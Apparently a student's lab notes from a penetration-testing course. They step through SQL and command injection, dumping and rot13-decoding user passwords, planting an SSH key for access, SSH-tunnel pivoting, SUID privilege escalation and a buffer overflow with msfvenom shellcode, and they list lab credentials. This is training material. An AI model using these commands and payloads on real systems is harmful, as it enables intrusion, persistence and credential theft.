1. Check notes.
2. Check FGs.
3. Ask google.
4. Ask instructor.

ssh demo1@10.50.14.253 -L1111:10.208.50.61:80
password
firefox -> 127.0.0.1:1111/classinfo

10.208.50.200/24
Stack nmber: 4
Username: JADU-019-M
Password: gXliXVXVuULy
scan this: 10.50.16.50 PublicFacingWebsite  (web server)

do NOT use your jump box today


10.50.16.50 
22, 53, 80
firefox--> 10.50.16.50

## Enumerate port 80 (reconaissance and scanning)
     linops$ nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.16.50
     went to an /login.html: possible admin folder. 
     ' OR 1='1  in username & password fields
     12 dev console, network tab
     Capture POST request payload via Network tab-->Request-->RAW slidebar. Copy the RAW Request payload.
     Add ? to URL and paste POST request raw payload
     in Decode String prompt i entered: ; cat /etc/password          (& decoded it from rot13)
     www-data:x:33:33:www-data:/var/www:/bin/sh           results show the home directory of www-data is /var/www

     linops$ nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.50.16.50       (the sql injection was from /login.html, vulnerable field was username)
     linops$ nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.50.16.50
     in Decode String prompt i entered: ; whoami          (i am www-data)

## After enumeration, upload your ssh key to gain access (web exploitation day 1)
     linops$ ssh-keygen -t rsa
     linops$ cat /home/student/.ssh/id_rsa
     in Decode String prompt i entered: ; ls -la /var/www      #check if .ssh exists
     in Decode String prompt i entered: ; mkdir /var/www/.ssh
     in Decode String prompt i entered: ; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys
     in Decode String prompt i entered: ; cat /users/home/directory/.ssh/authorized_keys
     linops$ ssh www-data@10.50.16.50
     ip addr: 10.10.28.20/27
     www-data$ sudo -l (results show user www-data can run sudo on /var/tmp/exploit_me)

## Enumerate next tgt
     linops$ ssh www-data@10.50.16.50 -D 9050 2>/dev/null
     linops$ proxychains nmap -Pn -T4 192.168.28.175   (ports 2222(ssh), 8000)
     linops$ ssh www-data@10.50.16.50 -L10601:192.168.28.175:8000
     firefox --> 127.0.0.1:10601


     ## SQL Injection (web exploitation day) 2 GET Method vs Post Method
     ?product=1 OR 1=1         ##repeat until you find vulnerable url (in this case its ?product=7 OR 1=1  ...u can tell its vulnerable bc it shows more info than its supposed to)
     ?product=7 UNION SELECT 1,2,@@version        ##version is 10.1.48-MariaDB-0ubuntu0.18.04.1
     ?product=7 UNION SELECT table_schema,table_name,column_name from information_schema.columns         ##use golden statement. find non-default databases, tables, and columns of interest.

     (end of timer for day)

     Reminder: UNION SELECT column, column, column, FROM database.table

     ?product=7 UNION SELECT table_schema,table_name,column_name from information_schema.columns
     information.schema is the database

     database, columns, tables

     ?product=7 UNION SELECT  user_id,name,username from siteusers.users       THIS WORKED!! 

     1 	nccyrObggbzW3na$ 	$Aaron
     2 	GhexrlQnl24 	$user2
     3 	Obo4GURCva3nccyrf 	$user3
     4 	Lroth 	$Lee_Roth
     4 	nabgurecnffjbeq4GURntrf 	$Lroth

     convert from rot13 to ascii

     1 	Aaron	appleBottomJ3an$
     2 	user2 	TurkeyDay24
     3 	user3	Bob4THEPin3apples          THIS USER WORKS
     4 	Lee_Roth	Lroth
     4 	Lroth	anotherpassword4THEages

www-data$ bash (to drop into a shell)

## Enumerate next tgt
     www-data$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done         (to ping sweep the entire network; results showed .1, .175 and .165)
     linops$ proxychains nmap -Pn -T4 192.168.28.165 (ports 22 & 8888 are open)
     exit out of -D 9050 
     linops$ ssh www-data@10.50.16.50 -L10603:192.168.28.165:8888 (no response)
     linops$ ssh www-data@10.50.16.50 -L10605:192.168.28.165:22
     linops$ ssh user3@localhost -p 10605 (user3: Bob4THEPin3apples)
     once you get on any new system, check:
     cat /etc/passwd 
     cat /etc/hosts

## Enumerate next tgt
     user3@RoundSensor$ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done          (run a pingsweep, results show another ip of 192.168.1.1)
     linops$ ssh user3@localhost -p 10605 -D 9050 2>/dev/null (user3: Bob4THEPin3apples)

     user3@RoundSensor$ find / -type f -perm /6000 -ls 2>/dev/null               (find all files with suid/sgid bit set)
     https://gtfobins.github.io/#find        search firefox for vulnerable cmds
     followed instructions to escalate privileges, then dropped into a bash shell, then ran a ping sweep: for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done (results showed 192.168.28.189)
     linops$ proxychains nmap -Pn -T4 192.168.28.189     (results show open ports: 22, 135, 139, 445, 3389, 5357, 9999)
     linops$ ssh user3@localhost -p 10605 -L 10606:192.168.28.189:3389        (user3: Bob4THEPin3apples)    
     linops$ xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:localhost:10606 /cert-ignore

## Buffer Overflow using gdb and env (reverse engineering)
DO IT ON THE TGT SYSTEM !!! ALL OF THIS MUST BE DONE ON THE FUCKING TGT SYSTEM !!!
     linops$ gdb exploit_me
     gdb-peda$ run
     go to wiremask generate a pattern with a length of 100
     gdb-peda$ r <long ass pattern>
     find where the EIP value is. it should be the same value as the last line where it says Stopped Reason: SIGSEGV 0x##### in ??(). input that value as the offset value in wiremask website.
     split screen, touch /tmp/exploit.py, chmod 777, then vi /tmp/exploit.py
     urmom = "A" * 55
     eip = "BBBB"
     nop = '\x90' * 5
     print(urmom+eip+nop)
     :w!
     gdb-peda$ run $(python exploit.py)           (if the arguement is immediately after the exe name, then dont use the <<<)
     gdb-peda$ exit. then linops$ env - gdb <exploit_name>
     (gdb) show env
     (gdb) unset env LINES
     (gdb) unset env COLUMNS
     Now that we have the memory layout for this program we need to select a start and end to search through for a "jmp esp". In order to do that we take the start address after the heap and the end address before the stack.
     To search for "jmp esp" run the command: find /b 0xfirstmemaddrafterheap , 0xlastmemaddr, 0xff, 0xe4           The start and end address can be different based on the program and the system that program executes on. The 0xff and 0xef does not change
     This command should return a ton of memory addresses. Choose the 2nd or 3rd memory address and copy it into your exploit code. Remember that we are on a little endian cpu architecture, so hex for the memory address will have to be submitted in reverse.
     add that mem addr into exploit.py as the eip value
     linops$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python      this will take awhile & will generate a buffer. copy paste it to the end of the script. make sure the script is on the tgt machine. rn the script looks like.
          urmom = "A" * 55
     eip = "\xab\x48\xf6\xf7"
     nop = '\x90' * 32
     buf =  b""
     buf += b"\xba\xb8\x38\xee\xd4\xda\xd4\xd9\x74\x24\xf4\x58"
     buf += b"\x33\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8"
     buf += b"\xfc\xe2\x4d\x52\xe5\x8c\x34\xf1\x9f\x44\x6b\x95"
     buf += b"\xd6\x72\x1b\x76\x9a\x14\xdb\xe0\x73\x87\xb2\x9e"
     buf += b"\x02\xa4\x16\xb7\x1d\x2b\x96\x47\x31\x49\xff\x29"
     buf += b"\x62\xfe\x97\xb5\x2b\x53\xee\x57\x1e\xd3"

     print(urmom+eip+nop+buf)
     ~                                        
     on the tgt machine: sudo ./exploit_me $(python exploit.py)       then itll show a # if it worked & you can enter whoami & itll show root!!
          

## PEN TESTING AND VULN

  -> Advanced Scanning Techniques
  Host Discovery
  
  Find hosts that are online
  
  Port Enumeration
  
  Find ports for each host that is online
  
  Port Interrogation
  
  Find what service is running on each open/available port
  
  
SSH for Reconnaissance
Why? "Live off the land", route tools, reach internal services

Dynamic SOCKS (-D): Proxychains support (TCP only)

Local Forward (-L): Access internal services (web/SSH)

Remote Forward (-R): Expose local tools to target

ProxyJump (-J): Clean multi-hop navigation




Script Management
Scripts are stored in a subdirectory of the Nmap data directory by default:



/usr/share/nmap/scripts



Usage and Examples
!!! Note NSE scripts provide automated vulnerability detection and service enumeration capabilities

# Run specific script or category
nmap --script <filename>|<category>|<directory>

# Get help for specific scripts
nmap --script-help "ftp-* and discovery"

# Pass arguments to scripts
nmap --script-args <args>
nmap --script-args-file <filename>

# Get help for scripts
nmap --script-help <filename>|<category>|<directory>

# Enable script tracing for debugging
nmap --script-trace

master socket ssh -> every box create a new master socket
ssh -MS /tmp/jump demo1@10.50.12.21

proxychains
ssh -S /tmp/jump jump -O forward -D 9050

-> nmap for host discovery ip
for i in {1..255}; do (ping -c 1 10.50.12.$i | grep "bytes from" &); done

64 bytes from 10.50.12.22: 53
64 bytes from 10.50.12.23: 22, 53, 3389
64 bytes from 10.50.12.24: 22, 53, 3389


-> running a script wildcard* if you dont know which to use
nmap -p 53 --script dns* 10.50.12.22-24

to verify http 300s redirection 400s errors
nmap -p 80 --script http-enum 10.50.12.22-24

-> ping sweep
for i in {96..128}; do proxychains nc -nvzw1 192.168.NetID.$i 22 53 80 135 137 139 445 2>&1 | grep OK | grep -Eo "192.168.NetID.:[0-9]" ;done
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
multiple port forward
ssh -S /tmp/jump jump -O forward -L 1111:10.50.12.21:22 -L 1112:10.50.12.21:80

cancel them
ssh -S /tmp/jump jump -O cancel -L 1111:10.50.12.21:22 -L 1112:10.50.12.21:80

to check to make sure connections is connected
ss -antlp





